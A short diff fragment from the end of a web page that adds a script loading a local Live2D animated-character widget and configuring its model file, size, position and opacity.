+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/22.2017.cba-normal.model.json"},"display":{"position":"left","width":300,"height":600,"hOffset":-60,"vOffset":-150},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
